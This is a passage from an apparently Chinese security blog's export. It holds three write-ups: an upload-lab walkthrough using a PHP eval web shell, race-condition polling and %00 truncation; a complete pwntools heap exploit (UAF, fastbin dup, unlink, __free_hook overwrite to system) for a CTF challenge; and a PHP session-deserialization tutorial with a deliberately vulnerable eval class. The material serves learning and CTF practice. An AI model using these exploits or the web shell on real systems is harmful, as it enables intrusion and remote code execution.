class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>&#x3D;&#x3D;Pass-18&#x3D;&#x3D;</p>
<p>查看提示需要代码审计</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913099.png" alt="image-20241018220600826" style="zoom:50%;" />

<p>​	使用<code>move_uploaded_file()</code>函数，将上传的文件保存到服务器，再进行判断是否是<code>jpg、png、gif</code>中的一种类型，如果在数组中就保存重命名，如果不在根据<code>unlink()</code>就直接删除</p>
<p>​	代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p>
<p><strong>通关步骤：</strong></p>
<p>上传<code>&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;</code>然后<code>bp</code>拦截，发送到<code>Intruder</code></p>
<p>设置<code>payload</code>类型</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912203.png" alt="image-20241018220215886" style="zoom:50%;" />

<p>增多线程数</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912712.png" alt="image-20241018220239756" style="zoom:50%;" />

<p>开始攻击，然后运行脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://172.20.10.10/uploads/upload/1.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a><code>%00</code>截断绕过</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912556.png" alt="image-20241018230053056" style="zoom:50%;" />

<ul>
<li>黑名单中没有过滤<code>PHP</code>，因此可以利用大写绕过</li>
<li>通过<code>move_upload_file()</code>函数移动文件<ul>
<li>因此可以修改后缀为<code>php/.</code>，<code>php/.</code>可以绕过黑名单，<code>move_upload_file()</code>函数会删除末尾的<code>/.</code></li>
<li>或者利用<code>%00</code>截断绕过</li>
</ul>
</li>
<li><code>$file_name</code>是通过<code>POST</code>传参获取的，<code>bp</code>抓包修改应<code>POST</code>参数后缀为<code>PHP</code></li>
</ul>
<p>最后再介绍一下<code>%00</code>截断绕过的方法</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911620.png" alt="image-20241018232435030"></p>
<p>发送上传成功后，打开图像链接</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911041.png" alt="image-20241018232615034" style="zoom:50%;" />

<p>成功解析脚本</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911844.png" alt="image-20241018232640959" style="zoom:50%;" />
]]></content>
      <categories>
        <category>web安全</category>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>wdb_2018_1st_babyheap</title>
    <url>/2024/07/31/wdb-2018-1st-babyheap/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li>更深刻的理解了，<code>fast bin</code>中的每一个<code>bin</code>都服从**<code>LIFO</code>**策略。即，对于<code>size</code>相同的<code>chunk</code>，先被放进<code>fastbin</code>，后被回收。</li>
<li>学到一个只利用<code>add</code>，向<code>fast bin</code>中添加<code>fake_chunk_hook</code>的方法：<br>在<code>fast bin</code>中，构造<code>chunk1--&gt;chunk0--&gt;chunk1</code>这样一条指针链。<code>add</code>一次，回收<code>chunk1</code>时，向其<code>fd</code>字段写入<code>fake_chunk_hook</code>。如此，<code>fast bin</code>中便又形成了<code>chunk0--&gt;chunk1--&gt;fake_chunk_hook</code>这样一条指针链。</li>
</ol>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>正常的堆菜单，程序中有_add,edit,show,delete_这四个功能。</p>
<p>其中，每次_add_都会创建固定<code>0x30</code>大小的_chunk_，只能读入<code>0x20</code>个字节，_.bss_段处只能有<code>10</code>个_hook_。_edit_，也只能读入<code>0x20</code>个字节，并且_edit_只能利用<code>3</code>次，其计数变量_cnt_存在于地址<code>0x6020b0</code>。_show_，可以打印出_chunk_里的数据。_delete_，_free_后没有将指针置零，存在_uaf_漏洞。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><em>unlink</em></h3><p>想要_unlink_必须要能使_prev_inuse_位为<code>0</code>，怎么能改写_chunk1_的_prev_inuse_位？可以让_chunk_hook_直接指向_chunk1_addr_。怎么让_chunk_hook_指向_chunk1_prev_size_？可以让<code>fastbin</code>中出现_chunk1_addr-<code>0x10</code>_，然后_add_。怎么能_add_成功？必须使_chunk1_addr-<code>0x18</code>_地址处的值为<code>0x30</code>。</p>
<h4 id="泄漏-chunk1-addr"><a href="#泄漏-chunk1-addr" class="headerlink" title="泄漏_chunk1_addr_"></a>泄漏_chunk1_addr_</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">chunk1_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;chunk1_addr&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>_chunk1_addr_就是_chunk1_的_prev_size_字段的地址。</p>
<h4 id="向-fastbin-添加-chunk1-addr-0x10"><a href="#向-fastbin-添加-chunk1-addr-0x10" class="headerlink" title="向_fastbin_添加_chunk1_addr-0x10_"></a>向_fastbin_添加_chunk1_addr-0x10_</h4><p>这部分，原来我也用掉了一次_edit_，但是后面_edit_次数就不够了，然后思路就一直卡在这儿了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#fastbin中chunk0--&gt;chunk1,先回收chunk0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#chunk1--&gt;chunk0--&gt;chunk1 </span></span><br><span class="line"><span class="comment">#这样我们add一次，会回收chunk1,并向其写入p64(chunk1_addr-0x10)。fastbin中依然有chunk1，其fd=p64(chunk1_addr-0x10),chunk1_addr-0x10便成功被加入到fastbin中</span></span><br><span class="line">add(<span class="number">5</span>,p64(chunk1_addr-<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure>

<h4 id="写入-fake-size"><a href="#写入-fake-size" class="headerlink" title="写入_fake_size_"></a>写入_fake_size_</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content:&quot;</span>,payload)</span><br></pre></td></tr></table></figure>

<h4 id="add-fake-hook"><a href="#add-fake-hook" class="headerlink" title="add fake_hook"></a><em>add</em> <em>fake_hook</em></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))   <span class="comment">#同时我们改写chunk1的prev_inuse位为0</span></span><br></pre></td></tr></table></figure>

<h4 id="写入-fd-bk-，unlink"><a href="#写入-fd-bk-，unlink" class="headerlink" title="写入_fd,bk_，unlink"></a>写入_fd,bk_，<em>unlink</em></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># edit(0)，写入fd,bk</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x602090</span>-<span class="number">0x18</span>)+p64(<span class="number">0x602090</span>-<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content:&quot;</span>,payload)</span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<h3 id="泄漏-libc-攻击"><a href="#泄漏-libc-攻击" class="headerlink" title="泄漏_libc_攻击"></a>泄漏_libc_攻击</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0x6020b0</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(chunk1_addr+<span class="number">0x10</span>)+p64(<span class="number">0x602078</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content:&quot;</span>,payload)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>))</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">payload = p64(chunk1_addr+<span class="number">0xa0</span>)+p64(free_hook)+p64(chunk1_addr+<span class="number">0x10</span>)+p64(<span class="number">0x602078</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content:&quot;</span>,payload)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">4</span>,p64(system))</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./wdb_2018_1st_babyheap&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26682</span>)</span><br><span class="line">debug(p,<span class="number">0x400D59</span>,<span class="number">0x400D65</span>,<span class="number">0x400D7D</span>,<span class="number">0x400D71</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./wdb_2018_1st_babyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">chunk1_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;chunk1_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>,p64(chunk1_addr-<span class="number">0x10</span>))</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content:&quot;</span>,payload)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x602090</span>-<span class="number">0x18</span>)+p64(<span class="number">0x602090</span>-<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content:&quot;</span>,payload)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x6020b0</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(chunk1_addr+<span class="number">0x10</span>)+p64(<span class="number">0x602078</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content:&quot;</span>,payload)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>))</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">payload = p64(chunk1_addr+<span class="number">0xa0</span>)+p64(free_hook)+p64(chunk1_addr+<span class="number">0x10</span>)+p64(<span class="number">0x602078</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content:&quot;</span>,payload)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">4</span>,p64(system))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#最初成功unlink</span></span><br><span class="line"><span class="string">payload = b&#x27;b&#x27;*0x10+p64(0)+p64(0x30)</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;Choice:&quot;,str(1))</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;Index:&quot;,str(5))</span></span><br><span class="line"><span class="string">p.sendafter(&quot;Content:&quot;,payload)</span></span><br><span class="line"><span class="string">edit(1,p64(chunk1_addr-0x10))</span></span><br><span class="line"><span class="string">add(6,p64(chunk1_addr-0x10))</span></span><br><span class="line"><span class="string">add(7,p64(0x20)+p64(0x90))</span></span><br><span class="line"><span class="string">payload = p64(0)*2+p64(0x602088-0x18)+p64(0x602088-0x10)</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;Choice:&quot;,str(2))</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;Index:&quot;,str(0))</span></span><br><span class="line"><span class="string">p.sendafter(&quot;Content:&quot;,payload)</span></span><br><span class="line"><span class="string">delete(6)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#改进版本</span></span><br><span class="line"><span class="string">delete(1)</span></span><br><span class="line"><span class="string">add(5,p64(chunk1_addr-0x10))</span></span><br><span class="line"><span class="string">payload = b&#x27;b&#x27;*0x10+p64(0)+p64(0x30)</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;Choice:&quot;,str(1))</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;Index:&quot;,str(6))</span></span><br><span class="line"><span class="string">p.sendafter(&quot;Content:&quot;,payload)</span></span><br><span class="line"><span class="string">add(7,b&#x27;b&#x27;*8)</span></span><br><span class="line"><span class="string">add(8,p64(0x20)+p64(0x90))</span></span><br><span class="line"><span class="string">payload = p64(0)*2+p64(0x602060-0x18)+p64(0x602060-0x10)</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;Choice:&quot;,str(2))</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;Index:&quot;,str(0))</span></span><br><span class="line"><span class="string">p.sendafter(&quot;Content:&quot;,payload)</span></span><br><span class="line"><span class="string">delete(1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPSession反序列化</title>
    <url>/2025/02/06/web%E5%AE%89%E5%85%A8-phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="有关session的基础知识"><a href="#有关session的基础知识" class="headerlink" title="有关session的基础知识"></a>有关session的基础知识</h2><p>先来了解一下关于<code>session</code>的一些基础知识</p>
<p>什么是session？</p>
<span id="more"></span>

<blockquote>
<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的  Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web  页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>
</blockquote>
<p>session是如何起作用的？</p>
<blockquote>
<p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session  ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session  ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion  ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
</blockquote>
<p>除此之外，还需要知道<code>session_start()</code>这个函数已经这个函数所起的作用：</p>
<blockquote>
<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP  内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP  会自动反序列化session文件的内容，并将之填充到 $_SESSION  超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p>
</blockquote>
<h2 id="PHPSession序列化机制"><a href="#PHPSession序列化机制" class="headerlink" title="PHPSession序列化机制"></a>PHPSession序列化机制</h2><p>先了解一下php.ini中的一些Session配置</p>
<blockquote>
<p>session.save_path&#x3D;”” –设置session的存储路径<br>session.save_handler&#x3D;””–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)<br>session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动<br>session.serialize_handler string–定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</p>
</blockquote>
<p>Linux上搭建的话，常见的<code>php-session</code>存放位置：<br>&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sess_PHPSESSID、&#x2F;var&#x2F;lib&#x2F;php7&#x2F;sess_PHPSESSID、&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID、&#x2F;tmp&#x2F;sess_PHPSESSID、&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSED</p>
<p>根据<code>php.ini</code>中的配置项，将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th>处理器</th>
<th>存储格式</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>php_serialize</td>
<td>经过serialize()函数反序列后的数组</td>
<td>a:1:{s:8:”sesssion”;s:3:”hhh”;}</td>
</tr>
<tr>
<td>php</td>
<td>键名+&#96;</td>
<td>&#96;+经过serialize()函数反序列后的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的ASCII字符+键名+经过serialize()反序列后的值</td>
<td>不可见字符+sesssions:3:”hhh”;</td>
</tr>
</tbody></table>
<h2 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a>漏洞利用演示</h2><p>ps.php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);<span class="comment">//用于在运行时设置配置选项</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();<span class="comment">//用于启动一个新的会话或恢复现有的会话。会话数据存储在服务器上，通过会话ID（通常存储在Cookie中）来识别。</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sesssion&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ses&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>p.php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(); </span><br></pre></td></tr></table></figure>

<p>poc.php</p>
